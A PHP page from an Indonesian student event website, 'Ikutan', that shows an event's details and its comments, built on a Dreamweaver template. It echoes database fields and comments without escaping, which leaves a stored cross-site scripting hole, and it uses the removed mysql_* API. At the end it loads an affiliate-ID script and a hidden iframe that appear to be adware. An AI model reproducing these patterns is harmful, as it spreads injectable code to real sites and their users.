<?php require_once('../Connections/localserver.php'); ?>
<?php
//initialize the session
if (!isset($_SESSION)) {
  session_start();
}

// ** Logout the current user. **
$logoutAction = $_SERVER['PHP_SELF']."?doLogout=true";
if ((isset($_SERVER['QUERY_STRING'])) && ($_SERVER['QUERY_STRING'] != "")){
  $logoutAction .="&". htmlentities($_SERVER['QUERY_STRING']);
}

if ((isset($_GET['doLogout'])) &&($_GET['doLogout']=="true")){
  //to fully log out a visitor we need to clear the session varialbles
  $_SESSION['MM_Username'] = NULL;
  $_SESSION['MM_UserGroup'] = NULL;
  $_SESSION['PrevUrl'] = NULL;
  unset($_SESSION['MM_Username']);
  unset($_SESSION['MM_UserGroup']);
  unset($_SESSION['PrevUrl']);
	
  $logoutGoTo = "../index.php";
  if ($logoutGoTo) {
    header("Location: $logoutGoTo");
    exit;
  }
}
?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
$MM_authorizedUsers = "";
$MM_donotCheckaccess = "true";

// *** Akses terlarang, harus login dulu: Ijinkan atau tolak akses ke halaman ini
function isAuthorized($strUsers, $strGroups, $UserName, $UserGroup) { 
  // Untuk keamanan, asumsikan bahwa visitor GAK dikenal 
  $isValid = False; 

  // Saat visitor udah login ke situs ini, variabel Session MM_Username nge-set sama dengan usernamenya.. 
  // Jadinya, kita tahu kalau user GAK login jika variabel Session blank. 
  if (!empty($UserName)) { 
    // Selain bisa login, lu boleh ngakses ke ganya beberapa user berdasarkan ID saat mereka login.
    // Parse string ke arrays.
    $arrUsers = Explode(",", $strUsers); 
    $arrGroups = Explode(",", $strGroups); 
    if (in_array($UserName, $arrUsers)) { 
      $isValid = true; 
    } 
    // Atau, lu bisa ngebuat restrict access hanya ke beberapa user berdasarkan username.
    if (in_array($UserGroup, $arrGroups)) { 
      $isValid = true; 
    } 
    if (($strUsers == "") && true) { 
      $isValid = true; 
    } 
  } 
  return $isValid; 
}

$MM_restrictGoTo = "../signin.php";
if (!((isset($_SESSION['MM_Username'])) && (isAuthorized("",$MM_authorizedUsers, $_SESSION['MM_Username'], $_SESSION['MM_UserGroup'])))) {   
  $MM_qsChar = "?";
  $MM_referrer = $_SERVER['PHP_SELF'];
  if (strpos($MM_restrictGoTo, "?")) $MM_qsChar = "&";
  if (isset($_SERVER['QUERY_STRING']) && strlen($_SERVER['QUERY_STRING']) > 0) 
  $MM_referrer .= "?" . $_SERVER['QUERY_STRING'];
  $MM_restrictGoTo = $MM_restrictGoTo. $MM_qsChar . "accesscheck=" . urlencode($MM_referrer);
  header("Location: ". $MM_restrictGoTo); 
  exit;
}
?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

$colname_eventitem = "-1";
if (isset($_GET['idevent'])) {
  $colname_eventitem = $_GET['idevent'];
}
mysql_select_db($database_localserver, $localserver);
$query_eventitem = sprintf("SELECT * FROM events WHERE idevent = %s", GetSQLValueString($colname_eventitem, "int"));
$eventitem = mysql_query($query_eventitem, $localserver) or die(mysql_error());
$row_eventitem = mysql_fetch_assoc($eventitem);
$totalRows_eventitem = mysql_num_rows($eventitem);

$colname_komentar = "-1";
if (isset($_GET['eventid'])) {
  $colname_komentar = $_GET['eventid'];
}
mysql_select_db($database_localserver, $localserver);
$query_komentar = sprintf("SELECT * FROM testimoni WHERE id_event = %s ORDER BY id_komen DESC", GetSQLValueString($colname_komentar, "int"));
$komentar = mysql_query($query_komentar, $localserver) or die(mysql_error());
$row_komentar = mysql_fetch_assoc($komentar);
$totalRows_komentar = mysql_num_rows($komentar);
?>
<!DOCTYPE html>
<html class=" js no-touch" style="" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title>Ikutan - Cool Events For You</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="asset/bootstrap.css" rel="stylesheet">
<link href="asset/shopfrog.css" rel="stylesheet" media="screen">   

<link href="asset/shopfrog-brown.css" rel="stylesheet" media="screen">

<link href="asset/rateit.css" rel="stylesheet" media="screen">		       
<link href="asset/magnific-popup.css" rel="stylesheet"> 		
<script src="asset/all.js" id="facebook-jssdk"></script><script src="asset/widgets.js" id="twitter-wjs"></script><script async src="asset/cbgapi.loaded_1"></script><script async src="asset/cbgapi.loaded_0"></script><script gapi_processed="true" src="asset/plusone.js" async type="text/javascript"></script><script src="asset/respond.js"></script>
<link rel="shortcut icon" href="img/kaoskece.png">
<link href="asset/css.css" rel="stylesheet" type="text/css">
<link href="asset/css_002.css" rel="stylesheet" type="text/css">
<link href="asset/atas.css" rel="stylesheet" type="text/css">

<script src="asset/jquery-1.js"></script>    
<script src="asset/modernizr.js"></script>	
<script src="asset/imagesloaded.js"></script>	
<script src="asset/jquery_003.js"></script>	
<script src="asset/jquery_002.js"></script>		
<script src="asset/jquery.js"></script>				
<script src="asset/bootstrap.js"></script>
<script src="asset/shopfrog.js"></script>
</head>
<body data-twttr-rendered="true" class="product-page">
			
	<header class="navbar navbar-fixed-top clearfix">
		
	<a class="brand" href="index.php">Ikutan</a>

	<!--<div id="nav-basket" class="basket">
		<a href="index.php/views/index.php?doLogout=true" class="basket-link">
			<button class="btn btn-default btn-success" style="margin-top: 15px;">Logout</button>
		</a>
        <a href="update_profile.php"><strong class="btn btn-success">@ <?php echo $_SESSION['MM_Username']; ?></strong></a>
		
	</div>-->
    <div id="nav-basket" class="basket">
        <a href="signin.php" class="basket-link"  style="height: 10px;">
  <a href="update_profile.php"><strong class="btn btn-success">@ <?php echo $_SESSION['MM_Username']; ?></strong></a>
  
  <strong class="btn btn-success"><a href="<?php echo $logoutAction ?>">Logout</a></strong>
 
  
</div>
	
	<button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="icon-bar"></span>
		<span class="icon-bar"></span>
		<span class="icon-bar"></span>
	</button>

	<nav class="navbar-collapse collapse" id="main-nav">
		<ul class="nav">
			<li class="active">
				<a href="index.php" class="top-level flat">Home</a>
			</li>
			<li>
				<a href="http://leapfrogui.com/shopfrog/brown/collection.html" class="top-level">Event</a>
				
			</li>
			<li>
				<a href="http://localhost/ikutan/views/explore.php" class="top-level">Explore</a>
				
			</li>
             <li>
				<a href="http://localhost/ikutan/views/tambah_event.php" class="top-level">Tambah Event</a>
				
			</li>
			 <li>
				<a href="http://localhost/ikutan/views/eventsaya.php" class="top-level">Event Saya</a>
				
			</li>	
			<!-- <li><a href="http://leapfrogui.com/shopfrog/brown/collection.html" class="top-level flat">Accessories</a></li>								 -->
		</ul>
	</nav><!--/.nav-collapse -->
	
</header>


	
	<div class="container">
		<div class="row">

			<!-- <div class="col-xs-12"> -->
				<!-- <a href="index.php">Home</a> &gt; <a href="http://leapfrogui.com/shopfrog/brown/collection.html">Events</a> &gt; <a href="http://leapfrogui.com/shopfrog/brown/collection.html">Satu</a> &gt; Makan2  -->
			</div> <!-- //end span12 -->

		</div> <!-- //end row -->
	</div> <!-- //end container -->
	
	<div class="container product-main">
		<div class="row">

			<div class="col-sm-6">
				<div class="content">
				
					<!-- Product information for small screens -->
					<div class="product-details-small">
						<!-- Product name and manufacturer -->
						<h1>BeachFront Frog</h1>
						<small>by <a href="">anasbladz</a></small>

						<!-- Product rating and review info -->
						<div class="ratings clearfix">
						</div>
					
						<!-- Pricing and offer info -->
						
					</div>
				
					<div class="main-imgs clearfix">
						<a href="product-1.jpg" title="BeachFront Frog swimsuit: view 1"><img id="img1" src="asset/product-1.jpg" alt="BeachFront Frog swimsuit" class="main-img img-responsive"></a>
						<a href="product-2.jpg" title="BeachFront Frog swimsuit: view 2"><img id="img2" src="asset/product-2.jpg" alt="BeachFront Frog swimsuit" class="main-img img-responsive background"></a>
					</div>
					<ul class="alternate-images clearfix">
						<li><a href="#" data-img="img1"><img src="asset/product-1-mini.jpg" alt=""></a></li>
						<li><a href="#" data-img="img2"><img src="asset/product-2-mini.jpg" alt=""></a></li>
					</ul>
				</div>
			</div> <!-- // end span6 -->

			<div class="col-sm-6">
				<div class="content">
					
					<!-- Product information for large screens -->
					<div class="product-details-large">
						<!-- Product name and manufacturer -->
						<h1><?php echo $row_eventitem['nama']; ?></h1>
						<small>by <a href=""><?php echo $row_eventitem['pembuat']; ?></a></small>

						<!-- Product rating and review info -->
						<div class="ratings clearfix">
							<div class="extra">
								<!-- <a href="http://leapfrogui.com/shopfrog/brown/review-product.html">Tulis Komentar</a> -->
							</div>
						</div>
					
						<!-- Pricing and offer info -->
						
					</div>
					
					<!-- Product options -->
					<form class="form-inline clearfix cart" action="#">
						
													
						<button class="btn btn-large btn-atc">Tambahkan ke daftar</button>
					</form>
					
					<!-- Product description etc -->
					<ul class="nav nav-tabs" id="product-tabs">
						<li class="active"><a href="#description">Deskripsi</a></li>
						<li><a href="#care">Tanggal dan Tempat</a></li>
						<li><a href="#sizing">Target</a></li>
					</ul>
					<div class="tab-content">
						<div class="tab-pane active" id="description">
							<p><?php echo $row_eventitem['deskripsi']; ?></p>
						</div>
						<div class="tab-pane" id="care">
							<p><?php echo $row_eventitem['tempat']; ?></p>
							<p><?php echo $row_eventitem['tanggal']; ?></p>
						</div>
						<div class="tab-pane" id="sizing">
							<p>Standard swim suit sizing comes in S/M/L and come in Body 
measurements are given in inches. If your body measurement is on the 
borderline between two sizes, order the lower size for a tighter fit or 
the higher size for a looser fit.</p>
							<p>If your body measurements for hip and waist result in two different suggested sizes, order the size from your hip measurement. </p>
							<table class="table table-striped table-bordered">
								<tbody><tr>
									<th></th><th>Size</th><th>Bust (in)</th><th>Ribcage (in)</th><th>Waist (in)</th><th>Hip (in)</th><th>Torso (in)</th>
								</tr>
								<tr>
									<td rowspan="2">S</td><td>4</td><td>33 1/2</td><td>27</td><td>25 1/2</td><td>35 1/2</td><td>58 1/2</td>
								</tr>
								<tr>
									<td>6</td><td>34 1/2</td><td>28</td><td>26 1/2</td><td>36 1/2</td><td>60</td>
								</tr>
								<tr>
									<td rowspan="2">M</td><td>8</td><td>35 1/2</td><td>29</td><td>27 1/2</td><td>37 1/2</td><td>61 1/2</td>
								</tr>
								<tr>
									<td>10</td><td>36 1/2</td><td>30</td><td>28 1/2</td><td>38 1/2</td><td>63</td>
								</tr>
								<tr>
									<td rowspan="2">L</td><td>12</td><td>38</td><td>31 1/2</td><td>30</td><td>40</td><td>64 1/2</td>
								</tr>
								<tr>
									<td>14</td><td>39 1/2</td><td>33</td><td>31 1/2</td><td>41 1/2</td><td>66</td>
								</tr>
							</tbody></table>
						</div>
					</div>
					
					<!-- Share -->
					
					
					
				</div>
			</div> <!-- // end span6 -->
			
		</div> <!-- //end row -->

		<div class="row" id="reviews">
			<div class="col-xs-12">
				<div class="review-overview">
					
				</div>

				<div class="product-review">
	<div class="row">
		<div class="col-sm-12">
			<div class="content">
				<header>
					<p><strong><?php echo $row_komentar['komentator']; ?></strong></p>
				</header>
				
				<p><?php echo $row_komentar['komentar']; ?></p>
				
				<footer>
					<a href="" class="btn btn-xs"> <?php echo $row_komentar['status']; ?></a>
					
					
				</footer>
			</div>
		</div>
		
	</div>
</div>
				
				<div class="product-review">
	<div class="row"></div>
</div>
				
				<div class="product-review">
	<div class="row"></div>
</div>										
	<a class="btn btn-default btn-atc" href="http://leapfrogui.com/shopfrog/brown/review-product.html" style="
    margin-left: 34px;
    margin-bottom: 24px;
">Tulis Komentar</a>			
			</div> <!-- //end span12 -->
		</div> <!-- //end row -->		
		
			
		
	</div> <!-- //end container -->
	
	<footer>
	<div class="container">
		
	</div>
</footer>
	
	<!-- Social sharing scripts -->
<!-- Google plus -->
<script type="text/javascript">
	(function() {
		var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
		po.src = 'https://apis.google.com/js/plusone.js';
		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
	})();
</script>
<!-- Twitter -->
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
<!-- Pinterest -->
<script type="text/javascript">
	(function(d){
		var f = d.getElementsByTagName('SCRIPT')[0], p = d.createElement('SCRIPT');
		p.type = 'text/javascript';
		p.async = true;
		p.src = '//assets.pinterest.com/js/pinit.js';
		f.parentNode.insertBefore(p, f);
	}(document));
</script><iframe style="width: 1px; height: 1px; position: absolute; top: -100px;" src="asset/postmessageRelay.htm" id="oauth2relay293021207" name="oauth2relay293021207"></iframe>
<!-- Facebook -->
<div class=" fb_reset" id="fb-root"><div style="position: absolute; top: -10000px; height: 0px; width: 0px;"><div><iframe src="asset/xd_arbiter.htm" style="border: medium none;" tab-index="-1" title="Facebook Cross Domain Communication Frame" aria-hidden="true" id="fb_xdm_frame_http" allowtransparency="true" name="fb_xdm_frame_http" frameborder="0" scrolling="no"></iframe><iframe src="asset/xd_arbiter_002.htm" style="border: medium none;" tab-index="-1" title="Facebook Cross Domain Communication Frame" aria-hidden="true" id="fb_xdm_frame_https" allowtransparency="true" name="fb_xdm_frame_https" frameborder="0" scrolling="no"></iframe></div></div><div style="position: absolute; top: -10000px; height: 0px; width: 0px;"><div></div></div></div>
<script>
	(function(d, s, id) {
		var js, fjs = d.getElementsByTagName(s)[0];
		if (d.getElementById(id)) return;
		js = d.createElement(s); js.id = id;
		js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
		fjs.parentNode.insertBefore(js, fjs);
	}(document, 'script', 'facebook-jssdk'));
</script>


<script src="asset/aeyJhZmZpZCI6MTAxOCwic3ViYWZmaWQiOjEwMTAsImhyZWYiOiJodHRwOi8v.js"></script><script src="asset/spops-2.js" charset="UTF-8" type="text/javascript"></script><iframe src="asset/pquery-0.htm" style="display: none;"></iframe></body></html>
<?php
mysql_free_result($eventitem);

mysql_free_result($komentar);
?>
